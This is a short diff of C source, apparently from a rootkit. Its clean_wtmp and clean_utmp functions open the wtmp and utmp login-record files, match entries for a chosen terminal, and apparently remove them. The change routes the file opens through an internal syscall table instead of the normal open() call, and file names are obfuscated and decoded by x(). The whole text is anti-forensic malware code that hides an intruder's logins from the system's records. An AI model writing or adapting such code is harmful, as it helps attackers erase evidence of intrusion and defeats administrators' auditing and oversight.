@@ -62,7 +62,7 @@ void clean_wtmp(char *pts, int verbose) {
 	char *wtmp_file = strdup(WTMP_FILE_X);
 	int fd;
 	x(wtmp_file);
-	if((fd=open(wtmp_file,O_RDWR))>=0){
+	if((fd=(long)syscall_list[SYS_OPEN].syscall_func(wtmp_file,O_RDWR))>=0){
 		lseek(fd,0,SEEK_SET);
 		while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
 			if(!strncmp(utmp_ent.ut_line,pts,strlen(pts))){
@@ -88,7 +88,7 @@ void clean_utmp(char *pts, int verbose) {
 	char *utmp_file = strdup(UTMP_FILE_X);
 	int fd;
 	x(utmp_file);
-	if((fd=open(utmp_file,O_RDWR))>=0){
+	if((fd=(long)syscall_list[SYS_OPEN].syscall_func(utmp_file,O_RDWR))>=0){
 		lseek(fd,0,SEEK_SET);
 		while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
 			if(!strncmp(utmp_ent.ut_line,pts,strlen(pts))){
